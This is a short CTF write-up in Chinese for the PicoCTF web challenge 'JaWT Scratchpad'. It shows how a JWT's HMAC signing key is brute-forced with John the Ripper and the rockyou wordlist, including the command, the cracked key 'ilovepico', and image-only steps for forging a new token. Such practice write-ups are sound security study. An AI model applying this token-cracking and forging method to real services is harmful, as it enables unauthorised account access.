---
title: PicoCTF - JaWT Scratchpad
tags: [PicoCTF, CTF, Web]

category: "Security Practice｜PicoCTF｜Web"
date: 2024-01-31
---

# PicoCTF - JaWT Scratchpad
<!-- more -->

## Background
[NTUCNS - HW3 - JWT Authentication](https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c)

## Recon
這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示：
![](https://hackmd.io/_uploads/S1B-01POh.png)

也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用[John](https://github.com/magnumripper/JohnTheRipper)，看起來就是用john-the-ripper解出token password

## Exploit - Brute Force
1. Brute Force Password
    ```bash!
    $ cat jwt.txt
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8%
    $ ./john.exe ../jwt.txt --wordlist=../rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    ilovepico        (?)
    1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
    Token Password: `ilovepico`
2. Check password & Construct New Token
![](https://hackmd.io/_uploads/BkjwMxDOh.png)

3. Get Flag
![](https://hackmd.io/_uploads/SJ85fxvun.png)


## Reference
[ pico2019 JaWT Scratchpad ](https://youtu.be/Ug7qTzFuZ9o)